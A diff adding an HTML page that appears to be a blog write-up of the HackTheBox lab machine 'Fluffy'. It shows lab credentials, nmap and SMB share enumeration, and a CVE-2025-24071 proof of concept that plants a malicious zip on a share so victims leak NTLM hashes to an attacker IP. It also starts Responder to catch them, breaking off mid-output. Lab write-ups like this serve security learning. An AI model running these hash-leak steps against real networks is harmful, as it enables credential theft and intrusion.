+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://www.linkedin.com/in/bailey-bradshaw-194597198/"
+          target="_blank"
+          aria-label="Hackthebox"
+          title="Hackthebox"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"></span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+  
+
+  
+
+  
+    <div class="mb-5"></div>
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+      
+        <div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
+            
+              <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#nmap-scan">Nmap Scan</a></li>
+      </ul>
+    </li>
+    <li><a href="#cve-2025-24071">CVE-2025-24071</a></li>
+    <li><a href="#bloodhound">Bloodhound</a></li>
+    <li><a href="#shadow-credentials">Shadow Credentials</a></li>
+    <li><a href="#usertxt">user.txt</a></li>
+    <li><a href="#esc16">ESC16</a></li>
+    <li><a href="#roottxt">root.txt</a></li>
+    <li><a href="#new-attack-methods-learned">New attack methods learned</a></li>
+    <li><a href="#possible-remediations">Possible Remediations</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#nmap-scan">Nmap Scan</a></li>
+      </ul>
+    </li>
+    <li><a href="#cve-2025-24071">CVE-2025-24071</a></li>
+    <li><a href="#bloodhound">Bloodhound</a></li>
+    <li><a href="#shadow-credentials">Shadow Credentials</a></li>
+    <li><a href="#usertxt">user.txt</a></li>
+    <li><a href="#esc16">ESC16</a></li>
+    <li><a href="#roottxt">root.txt</a></li>
+    <li><a href="#new-attack-methods-learned">New attack methods learned</a></li>
+    <li><a href="#possible-remediations">Possible Remediations</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+            
+            
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+<h2 class="relative group">Overview 
+    <div id="overview" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#overview" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li><strong>Platform</strong>: HackTheBox</li>
+<li><strong>Difficulty</strong>: Easy</li>
+<li><strong>OS</strong>: Windows</li>
+<li><strong>Skills</strong>: Active Directory, privilege escalation</li>
+</ul>
+<p><em><strong>Assumed Breach Credentials: j.fleischman / J0elTHEM4n1990!</strong></em></p>
+
+<h2 class="relative group">Reconnaissance 
+    <div id="reconnaissance" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#reconnaissance" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Nmap Scan 
+    <div id="nmap-scan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#nmap-scan" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sC -sV -p- -T4 10.10.11.69 -vv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        syn-ack ttl <span style="color:#ae81ff">127</span> Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-09-17 03:10:47Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-09-17T03:12:16+00:00; +7h01m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.fluffy.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>fluffy-DC01-CA/domainComponent<span style="color:#f92672">=</span>fluffy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds? syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?     syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-09-17T03:12:16+00:00; +7h01m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.fluffy.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>fluffy-DC01-CA/domainComponent<span style="color:#f92672">=</span>fluffy
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-09-17T03:12:16+00:00; +7h01m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.fluffy.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>fluffy-DC01-CA/domainComponent<span style="color:#f92672">=</span>fluffy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-09-17T03:12:16+00:00; +7h01m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.fluffy.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>fluffy-DC01-CA/domainComponent<span style="color:#f92672">=</span>fluffy
+</span></span><span style="display:flex;"><span>|
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        syn-ack ttl <span style="color:#ae81ff">127</span> .NET Message Framing
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49689/tcp open  ncacn_http    syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49690/tcp open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49693/tcp open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49710/tcp open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49716/tcp open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| p2p-conficker: 
+</span></span><span style="display:flex;"><span>|   Checking <span style="color:#66d9ef">for</span> Conficker.C or higher...
+</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>port 53865/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>port 48474/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>port 5751/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>port 48360/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2025-09-17T03:11:36
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 7h00m59s, deviation: 0s, median: 7h00m59s
+</span></span></code></pre></div><p>Add <code>fluffy.htb</code> and <code>dc01.fluffy.htb</code> to <code>/etc/hosts</code></p>
+<p>We use <code>Crackmapexec</code> to enumerate shares, and users on the domain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smfluffy.htb -u <span style="color:#e6db74">&#39;j.fleischman&#39;</span> -p <span style="color:#e6db74">&#39;J0elTHEM4n1990!&#39;</span> --shares
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SMB         fluffy.htb      <span style="color:#ae81ff">445</span>    DC01             IPC$            READ            Remote IPC                                                          
+</span></span><span style="display:flex;"><span>SMB         fluffy.htb      <span style="color:#ae81ff">445</span>    DC01             IT              READ,WRITE                                                                          
+</span></span><span style="display:flex;"><span>SMB         fluffy.htb      <span style="color:#ae81ff">445</span>    DC01             NETLOGON        READ            Logon server share                                                  
+</span></span><span style="display:flex;"><span>SMB         fluffy.htb      <span style="color:#ae81ff">445</span>    DC01             SYSVOL          READ            Logon server share
+</span></span></code></pre></div><p>We see an interesting share with <strong>READ</strong> and <strong>WRITE</strong> permissions, but its best to look in all the shares to see if we find anything else interesting.</p>
+<p>Lets use <code>Netexec</code>&rsquo;s spider_plus module to spider the shares and pull all the files in them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb fluffy.htb -u <span style="color:#e6db74">&#39;j.fleischman&#39;</span> -p <span style="color:#e6db74">&#39;J0elTHEM4n1990!&#39;</span> -M spider_plus
+</span></span></code></pre></div><p>You&rsquo;ll notice we find a pdf document with the name <code>Upgrade_Notice.pdf</code></p>
+<p>Lets check that out..</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Upgrade_Notice.pdf" src="/img/writeups/htb-fluffy/CVEPDF.png">
+
+  
+</figure>
+</p>
+<p>Just a couple of recent CVE&rsquo;s. But only one really sticks out to us.</p>
+<p>Considering we have write permissions in the <strong>IT</strong> share, we can try <a
+  href="https://github.com/0x6rss/CVE-2025-24071_PoC"
+    target="_blank"
+  >CVE-2025-24071</a> - NTLM Hash Leak via malicious RAR/ZIP and .library-ms file.</p>
+
+<h2 class="relative group">CVE-2025-24071 
+    <div id="cve-2025-24071" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#cve-2025-24071" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>root@kali<span style="color:#f92672">]</span> /home/kali/Fluffy/CVE-2025-24071_PoC <span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>❯ python poc.py                                               
+</span></span><span style="display:flex;"><span>Enter your file name: documents
+</span></span><span style="display:flex;"><span>Enter IP <span style="color:#f92672">(</span>EX: 192.168.1.162<span style="color:#f92672">)</span>: 10.10.16.75
+</span></span><span style="display:flex;"><span>completed
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@kali<span style="color:#f92672">]</span> /home/kali/Fluffy/CVE-2025-24071_PoC <span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> ⚡ 
+</span></span><span style="display:flex;"><span>❯ smbclient  //10.10.11.69/IT -U j.fleischman
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\j</span>.fleischman<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Thu May <span style="color:#ae81ff">29</span> 10:19:20 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Thu May <span style="color:#ae81ff">29</span> 10:19:20 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  docs.library-ms                     A      <span style="color:#ae81ff">528</span>  Thu May <span style="color:#ae81ff">29</span> 10:16:50 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  Everything-1.4.1.1026.x64           D        <span style="color:#ae81ff">0</span>  Fri Apr <span style="color:#ae81ff">18</span> 11:08:44 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  Everything-1.4.1.1026.x64.zip       A  <span style="color:#ae81ff">1827464</span>  Fri Apr <span style="color:#ae81ff">18</span> 11:04:05 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  KeePass-2.58                        D        <span style="color:#ae81ff">0</span>  Fri Apr <span style="color:#ae81ff">18</span> 11:08:38 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  KeePass-2.58.zip                    A  <span style="color:#ae81ff">3225346</span>  Fri Apr <span style="color:#ae81ff">18</span> 11:03:17 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  Upgrade_Notice.pdf                  A   <span style="color:#ae81ff">169963</span>  Sat May <span style="color:#ae81ff">17</span> 10:31:07 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5842943</span> blocks of size 4096. <span style="color:#ae81ff">1315680</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> put exploit.zip 
+</span></span><span style="display:flex;"><span>putting file exploit.zip as <span style="color:#ae81ff">\e</span>xploit.zip <span style="color:#f92672">(</span>0.9 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.9 kb/s<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Now we need to start <code>Responder</code> which will host a smb server and listen for a connection back</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>root@kali<span style="color:#f92672">]</span> /home/kali  
+</span></span><span style="display:flex;"><span>❯ responder -I tun0 -wvF
+</span></span><span style="display:flex;"><span>                                         __
+</span></span><span style="display:flex;"><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+</span></span><span style="display:flex;"><span>  |   _|  -__|__ --|  _  |  _  |     |  _  <span style="color:#f92672">||</span>  -__|   _|
+</span></span><span style="display:flex;"><span>  |__| |_____|_____|   __|_____|__|__|_____<span style="color:#f92672">||</span>_____|__|
+</span></span><span style="display:flex;"><span>                   |__|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  To support this project:
+</span></span><span style="display:flex;"><span>  Github -&gt; https://github.com/sponsors/lgandx
+</span></span><span style="display:flex;"><span>  Paypal  -&gt; https://paypal.me/PythonResponder
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Author: Laurent Gaffie <span style="color:#f92672">(</span>laurent.gaffie@gmail.com<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  To kill this script hit CTRL-C
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poisoners:
+</span></span><span style="display:flex;"><span>    LLMNR                      <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    NBT-NS                     <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    MDNS                       <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DNS                        <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DHCP                       <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Servers:
+</span></span><span style="display:flex;"><span>    HTTP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    HTTPS server               <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    WPAD proxy                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Auth proxy                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SMB server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Kerberos server            <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SQL server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    FTP server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    IMAP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    POP3 server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SMTP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DNS server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    LDAP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    MQTT server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    RDP server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DCE-RPC server             <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    WinRM server               <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SNMP server                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> HTTP Options:
+</span></span><span style="display:flex;"><span>    Always serving EXE         <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Serving EXE                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Serving HTML               <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Upstream Proxy             <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poisoning Options:
+</span></span><span style="display:flex;"><span>    Analyze Mode               <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
